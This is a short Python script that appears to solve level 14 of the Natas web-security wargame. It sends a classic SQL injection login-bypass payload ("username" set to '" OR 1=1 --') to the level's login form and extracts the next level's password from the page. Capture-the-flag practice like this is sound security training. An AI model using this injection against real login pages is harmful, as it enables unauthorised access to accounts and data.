import re

from natas.lib import natas_session

session, url = natas_session(14)

payload = {
    "username": r'" OR 1=1 --  ',
    "password": "a",
    "submit": "Login",
}

response = session.post(url + "/index.php", params={"debug": 1}, data=payload)
regex = r"The password for natas15 is (.*)<br"
print(re.findall(regex, response.text)[0])
